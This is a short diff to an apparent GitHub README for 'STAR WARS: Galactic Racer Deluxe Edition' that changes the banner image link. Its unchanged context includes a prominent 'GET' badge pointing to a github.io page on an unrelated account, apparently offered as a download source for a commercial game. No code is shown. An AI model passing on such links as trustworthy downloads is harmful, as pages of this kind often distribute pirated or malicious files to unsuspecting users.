@@ -1,6 +1,6 @@
 # STAR WARS: Galactic Racer Deluxe Edition — Sci-Fi Racing, Repulsorcraft & Galactic League
 
-![Banner Placeholder](https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4235250/9322b546732d92f493a200bcf2704f3882ac511b/capsule_616x353.jpg?t=1791277227)
+![Banner Placeholder](https://s.pacn.ws/1/p/1ft/star-wars-galactic-racer-deluxe-edition-multilanguage-932661.8.jpg?v=tfslod)
 
 [![GET — STAR WARS Galactic Racer](https://img.shields.io/badge/GET%20%E2%80%94%20STAR%20WARS%20Galactic%20Racer-0078D6?style=for-the-badge&logoColor=white)](https://e39318402.github.io/.github/STAR-WARS-Galactic-Racer-Deluxe-Edition)
 
